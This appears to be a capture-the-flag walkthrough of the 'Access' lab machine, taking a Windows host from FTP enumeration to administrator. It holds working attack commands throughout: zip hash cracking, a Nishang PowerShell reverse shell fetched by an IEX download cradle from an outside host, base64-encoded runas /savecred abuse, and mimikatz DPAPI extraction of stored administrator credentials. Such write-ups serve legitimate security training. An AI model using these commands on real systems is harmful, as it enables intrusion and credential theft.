# Reconnaissance
- 
## Nmap Enumeration
- We pass the commands:
```bash
nmap -sV -sC -vv 10.10.10.98
nmap-sU -vv --top-ports=40 10.10.98

---OUTPUT-TCP---
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Cant get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet? syn-ack ttl 127
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
|_http-title: MegaCorp
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows



---OUTPUT-UDP---
<no-response>
....
```
- FOR UDP
	- This is probably because in windows it doesnt send back an ICMP message so we don't know if its actually open or not hence nmap shows "open|filtered"
- TCP :
- FTP
- Telnet
- Http
## Website Enumeration

### Direct
-  **LON-MC6**
- An Image

## Directory Enumeration
- gobuster :
```bash
gobuster dir -u http://10.10.10.98 dns --wordlist /usr/share/wordlists/dirb/big.txt -o gobuster.root

---OUTPUT---
http://10.10.10.98/aspnet_client/
```
- Access denied
- ftp:
```bash
ftp 10.10.10.98
> anonymous : <no_pwd>/anonymous
> dir
> cd Backups
> dir
> get 
> get backup.mdb
> cd..
> cd Engineer
> dir
> get Access\ Control.zip

---OUTPUT---
---Main-Folder-dir---
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
---Backups-dir---
08-23-18  09:16PM              5652480 backup.mdb
---Engineer-dir---
08-24-18  01:16AM                10870 Access Control.zip

-----------
WARNING! 28296 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
```
- the error lead to the mdb table being unable to be read.
- to fix :
```bash
> type binary # Then get files
--OR--
use wget command
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
```
- When trying to unzip the zip file we get:
```bash
unzip Access\ Control.zip

---OUTPUT---
skipping: Access Control.pst      unsupported compression method 99
```
- This implies it is password protected
- When doing files command:
```bash
files Access\ Control.zip

---OUTPUT---
Access Control.zip: Zip archive data, at least v2.0 to extract, compression method=AES Encrypted
```
- it is AES Encrypted
- Using 7zip
```bash
7z x Access\ Control.zip

---OUTPUT---
7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:32 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870

    
Enter password (will not be echoed):

```
- We need to find the password.
- Two ways:
- **Using strings to extract a wordlist from backup.mdb**
- When we do strings command we see some information related to a DB so it may be unencrypted data
- We remove the unnecessary characters by specifying minimum string length, and sort it using the unique argument.
- Then we extract the text to use as a wordlist (could not do this but bruteforce might take longer)
```bash
cd Backups/
strings -n 8 backup.mdb | sort -u > wordlist
```
- We go back to the Access\ Control.zip folder and use zip2john to try and extract hashed password data from the zip file:
```bash
cd ../Engineer/
zip2john Access\ Control.zip > Access\ Control.hash
mv ../Backup/wordlist .
john Access\ Control.hash --wordlist=wordlist

---OUTPUT---
# Note if you've already cracked it, you can find it in the ~/.john/john.pot file
access4u@security (Access Control.zip/Access Control.pst)
```
- **Using mdbtools (NEW TOOL)**
- We can use mdbtools (install via apt) to read this file.
```bash
mdb-sql backup.mdb
> show tables
> go
--OR--
mdb--tables backup.mdb | grep "user"

# We see "auth user"
mdb-export backup.mdb auth_user

---OUTPUT---
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
```
- Or we can extract all tables and then check the contents of auth user
```bash
mkdir tables
for i in $(mdb-tables backup.mdb); do mdb-export backup.mdb $i; done > tables/$i
cat tables/auth_user

---OUTPUT---
id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
```
## Initial Foothold
- Unzip the file with the password and get a pst file
- We can read it via pst-utils (apt install it) which converts it to a readable mbox format:
```bash
readpst Access\ Control.pst
cat Access\ Control.mbox


---OUTPUT---
The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
```
- We access the machien via telnet with the credentials and get the user flag:
- username : security
- password : 4Cc3ssC0ntr0ller
- Need better shell:
- Check if powershell is working :
```bash
powershell whoami

---On-local-machine---
access\security
```
- Use Powershell reverse tcp by nishang
```bash
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 nishangtcppowershell.ps1
python3 -m http.server 8001 # on directory where exploit is
ALSO
nc -lvnp 9999
---ON-TARGET-MACHINE---
powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.25:8001/nishangtcppowershell.ps1')
```
- We should get reverse tcp powershell on listener.
## Privilege Escalation
- cmdkey /list (initial enumeration):
```bash
cmdkey /list

---OUTPUT---
Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator
```
- We are access so we can try to decrypt this (alternate path)
- Looking around we find a file in Public/Desktop
```bash
cd C:\Users\Public\Desktop
dir

---OUTPUT----a---         8/22/2018  10:18 PM       1870 ZKAccess3.5 Security System.lnk
```
- link file
- Get it's content:
```bash
get-Content "ZKAccess3.5 Security System.lnk"

---OUTPUT---
runas.exe???:1??:1?*Yrunas.exe▒L-K??E?C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico?%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico?%?
```
- runs runas.exe
- does a savecred : ACCESS\Administrator /savecred
- We try to execute a reverse shell:
```bash
runas /user:ACCESS\Administrator /savecred "powershell \IEX(New-Object Net.WebClient).downloadString('http://10.10.14.25:8001/9998.ps1')"
```
- It didn't work
- Windows processes everything in UTF-16LE, base64
- Convert to base64 for windows:
```bash
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.25:8001/9998.ps1')" | iconv --to-code UTF-16LE | base64 -w 0

---OUTPUT---
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIANQA6ADgAMAAwADEALwA5ADkAOQA4AC4AcABzADEAJwApAA==
```
- Pass the command with netcat listening:
```bash
runas /user:ACCESS\Administrator /savecred "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIANQA6ADgAMAAwADEALwA5ADkAOQA4AC4AcABzADEAJwApAA=="
```
- We gain Admin access
## Alternate Priv Esc Method (harder, DPAPI Abuse)
- https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/
- `At a high level, for the user scenario, a user’s password is used to derive a user-specific “master key”. These keys are located at C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>, where <SID> is the user’s security identifier and the GUID is the name of the master key. A user can have multiple master keys. This master key needs to be decrypted using the user’s password OR the domain backup key (see Chrome, scenario 4) and is then used to decrypt any DPAPI data blobs.`
- Credentials in : `\AppData\Local\Microsoft\Credentials\`
- Download mimiketz (https://github.com/gentilkiwi/mimikatz/releases):
```bash
PS> (New-Object Net.WebClient).DownloadFile('http://10.10.14.25:8001/mimikatz.exe','mimikatz.exe')
.\mimikatz.exe

---OUTPUT---
PS C:\Users\security\Desktop> Invoke-PowerShellTcp : Program 'mimikatz.exe' failed to execute: This program is blocked by group policy.
```
- It does not execute as its blocked by group policy
- We need to use meterpreter
- We try a few but Empire exploit is what works. (failed attempts will be below as its still good learning experience)
- unable to make it work
- **From pdf**
- This runas credential (and many other types of stored credentials) can be extracted from the Windows Data Protection API. In order to achieve this, it is necessary to identify the credential files and masterkeys. 
- Credential filenames are a string of 32 characters, e.g. "85E671988F9A2D1981A4B6791F9A4EE8" while masterkeys are a GUID, e.g. "cc6eb538-28f1-4ab4-adf2-f5594e88f0b2". 
- They have the "System files" attribute, and so "DIR /AS" must be used. The following "one-liner" will identify the available credential files and masterkeys:
```bash
cmd /c "dir /S /AS C:\Users\security\AppData\Local\Microsoft\Vault & dir /S /AS

---OUTPUT---
Directory of C:\Users\security\AppData\Roaming\Microsoft\Credentials

08/22/2018  10:18 PM    <DIR>          .
08/22/2018  10:18 PM    <DIR>          ..
08/22/2018  10:18 PM               538 51AB168BE4BDB3A603DADE4F8CA81290
               1 File(s)            538 bytes
...
 Directory of C:\Users\security\AppData\Roaming\Microsoft\Protect

08/22/2018  10:18 PM    <DIR>          .
08/22/2018  10:18 PM    <DIR>          ..
08/22/2018  10:18 PM                24 CREDHIST
08/22/2018  10:18 PM    <DIR>          S-1-5-21-953262931-566350628-63446256-1001
               1 File(s)             24 bytes

 Directory of C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001

08/22/2018  10:18 PM    <DIR>          .
08/22/2018  10:18 PM    <DIR>          ..
08/22/2018  10:18 PM               468 0792c32e-48a5-4fe3-8b43-d93d64590580
08/22/2018  10:18 PM                24 Preferred
               2 File(s)            492 bytes
```
	![[Pasted image 20250409064834.png]]
- **Powershell Base64 file transfer**
- The credential and masterkey are base64 encoded.
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\security\AppData\Roaming\Microsoft\Credentials\51AB168BE4BDB3A603DADE4F8CA81290"))

[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001\0792c32e-48a5-4fe3-8b43-d93d64590580"))

---OUTPUT-1---
AQAAAA4CAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAALsOSB6VI40+LQ9k9ZFkFgAAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAABBmAAAAAQAAIAAAAPW7usJAvZDZr308LPt/MB8fEjrJTQejzAEgOBNfpaa8AAAAAA6AAAAAAgAAIAAAAPlkLTI/rjZqT3KT0C8m5Ecq3DKwC6xqBhkURY2t/T5SAAEAAOc1Qv9x0IUp+dpf+I7c1b5E0RycAsRf39nuWlMWKMsPno3CIetbTYOoV6/xNHMTHJJ1JyF/4XfgjWOmPrXOU0FXazMzKAbgYjY+WHhvt1Uaqi4GdrjjlX9Dzx8Rou0UnEMRBOX5PyA2SRbfJaAWjt4jeIvZ1xGSzbZhxcVobtJWyGkQV/5v4qKxdlugl57pFAwBAhDuqBrACDD3TDWhlqwfRr1p16hsqC2hX5u88cQMu+QdWNSokkr96X4qmabp8zopfvJQhAHCKaRRuRHpRpuhfXEojcbDfuJsZezIrM1LWzwMLM/K5rCnY4Sg4nxO23oOzs4q/ZiJJSME21dnu8NAAAAAY/zBU7zWC+/QdKUJjqDlUviAlWLFU5hbqocgqCjmHgW9XRy4IAcRVRoQDtO4U1mLOHW6kLaJvEgzQvv2cbicmQ==

---OUTPUT-2---
AgAAAAAAAAAAAAAAMAA3ADkAMgBjADMAMgBlAC0ANAA4AGEANQAtADQAZgBlADMALQA4AGIANAAzAC0AZAA5ADMAZAA2ADQANQA5ADAANQA4ADAAAAAAAAAAAAAFAAAAsAAAAAAAAACQAAAAAAAAABQAAAAAAAAAAAAAAAAAAAACAAAAnFHKTQBwjHPU+/9guV5UnvhDAAAOgAAAEGYAAOePsdmJxMzXoFKFwX+uHDGtEhD3raBRrjIDU232E+Y6DkZHyp7VFAdjfYwcwq0WsjBqq1bX0nB7DHdCLn3jnri9/MpVBEtKf4U7bwszMyE7Ww2Ax8ECH2xKwvX6N3KtvlCvf98HsODqlA1woSRdt9+Ef2FVMKk4lQEqOtnHqMOcwFktBtcUye6P40ztUGLEEgIAAABLtt2bW5ZW2Xt48RR5ZFf0+EMAAA6AAAAQZgAAD+azql3Tr0a9eofLwBYfxBrhP4cUoivLW9qG8k2VrQM2mlM1FZGF0CdnQ9DBEys1/a/60kfTxPX0MmBBPCi0Ae1w5C4BhPnoxGaKvDbrcye9LHN0ojgbTN1Op8Rl3qp1Xg9TZyRzkA24hotCgyftqgMAAADlaJYABZMbQLoN36DhGzTQ
```
- Decode it to file for mimikatz inspection:
```powershell
[IO.File]::WriteAllBytes("51AB168BE4BDB3A603DADE4F8CA81290",[Convert]::FromBase64String("AQAAAA4CAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAALsOSB6VI40+LQ9k9ZFkFgAAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAABBmAAAAAQAAIAAAAPW7usJAvZDZr308LPt/MB8fEjrJTQejzAEgOBNfpaa8AAAAAA6AAAAAAgAAIAAAAPlkLTI/rjZqT3KT0C8m5Ecq3DKwC6xqBhkURY2t/T5SAAEAAOc1Qv9x0IUp+dpf+I7c1b5E0RycAsRf39nuWlMWKMsPno3CIetbTYOoV6/xNHMTHJJ1JyF/4XfgjWOmPrXOU0FXazMzKAbgYjY+WHhvt1Uaqi4GdrjjlX9Dzx8Rou0UnEMRBOX5PyA2SRbfJaAWjt4jeIvZ1xGSzbZhxcVobtJWyGkQV/5v4qKxdlugl57pFAwBAhDuqBrACDD3TDWhlqwfRr1p16hsqC2hX5u88cQMu+QdWNSokkr96X4qmabp8zopfvJQhAHCKaRRuRHpRpuhfXEojcbDfuJsZezIrM1LWzwMLM/K5rCnY4Sg4nxO23oOzs4q/ZiJJSME21dnu8NAAAAAY/zBU7zWC+/QdKUJjqDlUviAlWLFU5hbqocgqCjmHgW9XRy4IAcRVRoQDtO4U1mLOHW6kLaJvEgzQvv2cbicmQ=="))

[IO.File]::WriteAllBytes("0792c32e-48a5-4fe3-8b43-d93d64590580",[Convert]::FromBase64String("AgAAAAAAAAAAAAAAMAA3ADkAMgBjADMAMgBlAC0ANAA4AGEANQAtADQAZgBlADMALQA4AGIANAAzAC0AZAA5ADMAZAA2ADQANQA5ADAANQA4ADAAAAAAAAAAAAAFAAAAsAAAAAAAAACQAAAAAAAAABQAAAAAAAAAAAAAAAAAAAACAAAAnFHKTQBwjHPU+/9guV5UnvhDAAAOgAAAEGYAAOePsdmJxMzXoFKFwX+uHDGtEhD3raBRrjIDU232E+Y6DkZHyp7VFAdjfYwcwq0WsjBqq1bX0nB7DHdCLn3jnri9/MpVBEtKf4U7bwszMyE7Ww2Ax8ECH2xKwvX6N3KtvlCvf98HsODqlA1woSRdt9+Ef2FVMKk4lQEqOtnHqMOcwFktBtcUye6P40ztUGLEEgIAAABLtt2bW5ZW2Xt48RR5ZFf0+EMAAA6AAAAQZgAAD+azql3Tr0a9eofLwBYfxBrhP4cUoivLW9qG8k2VrQM2mlM1FZGF0CdnQ9DBEys1/a/60kfTxPX0MmBBPCi0Ae1w5C4BhPnoxGaKvDbrcye9LHN0ojgbTN1Op8Rl3qp1Xg9TZyRzkA24hotCgyftqgMAAADlaJYABZMbQLoN36DhGzTQ"))
```
- However since we were unable to get mimikatz to run in the target, we took the base64 string and saved it in our kali machine (if you manage to execute mimikatz on target, steps at bottom of page).
- We then decrypted it and used it on a Windows host where we have mimikatz
- Command 1 : we get the key which is added to the mimikatz cache
- Command 2 : we can then read the credentials
- Command 3 : This is what happens if we try to read credentials with password as input (Error)
```bash
vi masterkey.b64 # Copy Output 1 above
vi credentials.b64 # Copy output 2
cat masterkey.b64 | base64 -d > masterkey
cat credentials.b64 | base64 -d > credentials

---MOVE-FILES-TO-WINDOWS-HOST---
Run mimikatz.exe
> dpapi::masterkey /in:D:\Downloads\masterkey /sid:S-1-5-21-953262931-566350628-63446256-1001 /password:4Cc3ssC0ntr0ller
> dpapi::cred /in:D:\Downloads\credentials
> dpapi::cred /in:D:\Downloads\credentials /sid:S-1-5-21-953262931-566350628-63446256-1001 /password:4Cc3ssC0ntr0ller

---OUTPUT-1-MASTER-KEY---
**MASTERKEYS**
  dwVersion          : 00000002 - 2
  szGuid             : {0792c32e-48a5-4fe3-8b43-d93d64590580}
  dwFlags            : 00000005 - 5
  dwMasterKeyLen     : 000000b0 - 176
  dwBackupKeyLen     : 00000090 - 144
  dwCredHistLen      : 00000014 - 20
  dwDomainKeyLen     : 00000000 - 0
[masterkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : 9c51ca4d00708c73d4fbff60b95e549e
    rounds           : 000043f8 - 17400
    algHash          : 0000800e - 32782 (CALG_SHA_512)
    algCrypt         : 00006610 - 26128 (CALG_AES_256)
    pbKey            : e78fb1d989c4ccd7a05285c17fae1c31ad1210f7ada051ae3203536df613e63a0e4647ca9ed51407637d8c1cc2ad16b2306aab56d7d2707b0c77422e7de39eb8bdfcca55044b4a7f853b6f0b3333213b5b0d80c7c1021f6c4ac2f5fa3772adbe50af7fdf07b0e0ea940d70a1245db7df847f615530a93895012a3ad9c7a8c39cc0592d06d714c9ee8fe34ced5062c412

[backupkey]
  **MASTERKEY**
    dwVersion        : 00000002 - 2
    salt             : 4bb6dd9b5b9656d97b78f114796457f4
    rounds           : 000043f8 - 17400
    algHash          : 0000800e - 32782 (CALG_SHA_512)
    algCrypt         : 00006610 - 26128 (CALG_AES_256)
    pbKey            : 0fe6b3aa5dd3af46bd7a87cbc0161fc41ae13f8714a22bcb5bda86f24d95ad03369a5335159185d0276743d0c1132b35fdaffad247d3c4f5f43260413c28b401ed70e42e0184f9e8c4668abc36eb7327bd2c7374a2381b4cdd4ea7c465deaa755e0f53672473900db8868b428327edaa

[credhist]
  **CREDHIST INFO**
    dwVersion        : 00000003 - 3
    guid             : {009668e5-9305-401b-ba0d-dfa0e11b34d0}



[masterkey] with password: 4Cc3ssC0ntr0ller (normal user)
  key : b360fa5dfea278892070f4d086d47ccf5ae30f7206af0927c33b13957d44f0149a128391c4344a9b7b9c9e2e5351bfaf94a1a715627f27ec9fafb17f9b4af7d2
  sha1: bf6d0654ef999c3ad5b09692944da3c0d0b68afe

---OUTPUT-2-CREDENTIALS---
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {0792c32e-48a5-4fe3-8b43-d93d64590580}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data

  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : f5bbbac240bd90d9af7d3c2cfb7f301f1f123ac94d07a3cc012038135fa5a6bc
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 0000800e - 32782 (CALG_SHA_512)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : f9642d323fae366a4f7293d02f26e4472adc32b00bac6a061914458dadfd3e52
  dwDataLen          : 00000100 - 256
  pbData             : e73542ff71d08529f9da5ff88edcd5be44d11c9c02c45fdfd9ee5a531628cb0f9e8dc221eb5b4d83a857aff13473131c927527217fe177e08d63a63eb5ce5341576b33332806e062363e58786fb7551aaa2e0676b8e3957f43cf1f11a2ed149c431104e5f93f20364916df25a0168ede23788bd9d71192cdb661c5c5686ed256c8691057fe6fe2a2b1765ba0979ee9140c010210eea81ac00830f74c35a196ac1f46bd69d7a86ca82da15f9bbcf1c40cbbe41d58d4a8924afde97e2a99a6e9f33a297ef2508401c229a451b911e9469ba17d71288dc6c37ee26c65ecc8accd4b5b3c0c2ccfcae6b0a76384a0e27c4edb7a0ecece2afd9889252304db5767bbc3
  dwSignLen          : 00000040 - 64
  pbSign             : 63fcc153bcd60befd074a5098ea0e552f8809562c553985baa8720a828e61e05bd5d1cb8200711551a100ed3b853598b3875ba90b689bc483342fbf671b89c99
# ---if we execute 2 and 3 before 1 we only get this much---
Decrypting Credential:
 * volatile cache: GUID:{0792c32e-48a5-4fe3-8b43-d93d64590580};KeyHash:bf6d0654ef999c3ad5b09692944da3c0d0b68afe;Key:available
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 000000f4 - 244
  credUnk0       : 00002004 - 8196

  Type           : 00000002 - 2 - domain_password
  Flags          : 00000000 - 0
  LastWritten    : 8/22/2018 9:18:49 PM
  unkFlagsOrSize : 00000038 - 56
  Persist        : 00000003 - 3 - enterprise
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : Domain:interactive=ACCESS\Administrator
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : ACCESS\Administrator
  CredentialBlob : 55Acc3ssS3cur1ty@megacorp
  Attributes     : 0

---OUTPUT-3-ERROR---
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {0792c32e-48a5-4fe3-8b43-d93d64590580}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 0000003a - 58
  szDescription      : Enterprise Credential Data

  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : f5bbbac240bd90d9af7d3c2cfb7f301f1f123ac94d07a3cc012038135fa5a6bc
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 0000800e - 32782 (CALG_SHA_512)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : f9642d323fae366a4f7293d02f26e4472adc32b00bac6a061914458dadfd3e52
  dwDataLen          : 00000100 - 256
  pbData             : e73542ff71d08529f9da5ff88edcd5be44d11c9c02c45fdfd9ee5a531628cb0f9e8dc221eb5b4d83a857aff13473131c927527217fe177e08d63a63eb5ce5341576b33332806e062363e58786fb7551aaa2e0676b8e3957f43cf1f11a2ed149c431104e5f93f20364916df25a0168ede23788bd9d71192cdb661c5c5686ed256c8691057fe6fe2a2b1765ba0979ee9140c010210eea81ac00830f74c35a196ac1f46bd69d7a86ca82da15f9bbcf1c40cbbe41d58d4a8924afde97e2a99a6e9f33a297ef2508401c229a451b911e9469ba17d71288dc6c37ee26c65ecc8accd4b5b3c0c2ccfcae6b0a76384a0e27c4edb7a0ecece2afd9889252304db5767bbc3
  dwSignLen          : 00000040 - 64
  pbSign             : 63fcc153bcd60befd074a5098ea0e552f8809562c553985baa8720a828e61e05bd5d1cb8200711551a100ed3b853598b3875ba90b689bc483342fbf671b89c99

Decrypting Credential:
 * volatile cache: GUID:{0792c32e-48a5-4fe3-8b43-d93d64590580};KeyHash:bf6d0654ef999c3ad5b09692944da3c0d0b68afe;Key:available
 > password      : 4Cc3ssC0ntr0ller
ERROR kull_m_dpapi_unprotect_blob ; CryptDecrypt (0x80090005)
```
- From Output 2 :
- Password : 55Acc3ssS3cur1ty@megacorp
- We telnet to machine with the following credentials for admin access:
- Username : administrator
- Password : 55Acc3ssS3cur1ty@megacorp
```bash
telnet 10.10.10.98
> login : administrator
> password : 55Acc3ssS3cur1ty@megacorp
```
- We get root.txt
-------
--------

## Notes

- The mimikatz Wiki provides detailed guidance on working with Windows Credential Manager saved credentials.
- https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials
## JAWS enumeration
- Can grab jaws-enum and execute to find some files
```bash
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.25:8001/jaws-enum.ps1')
```
### If mimikatz was executable at target
- The credential file is examined, which reveals the corresponding masterkey (guidMasterKey). This matches the masterkey that was extracted. 
```bash
dpapi::cred /in:51AB168BE4BDB3A603DADE4F8CA81290
/sid:S-1-5-21-953262931-566350628-63446256-1001 /password:4Cc3ssC0ntr0ller
```
- The masterkey file is examined next, and the key is extracted.
```bash
dpapi::masterkey /in:0792c32e-48a5-4fe3-8b43-d93d64590580
/sid:S-1-5-21-953262931-566350628-63446256-1001 /password:4Cc3ssC0ntr0ller
```
- With the masterkey in mimikatz’s cache, the credential blob can now be decrypted. It is now possible to open a telnet session as ACCESS\Administrator and gain the root flag.
```bash
dpapi::cred /in:51AB168BE4BDB3A603DADE4F8CA81290
```

--------------
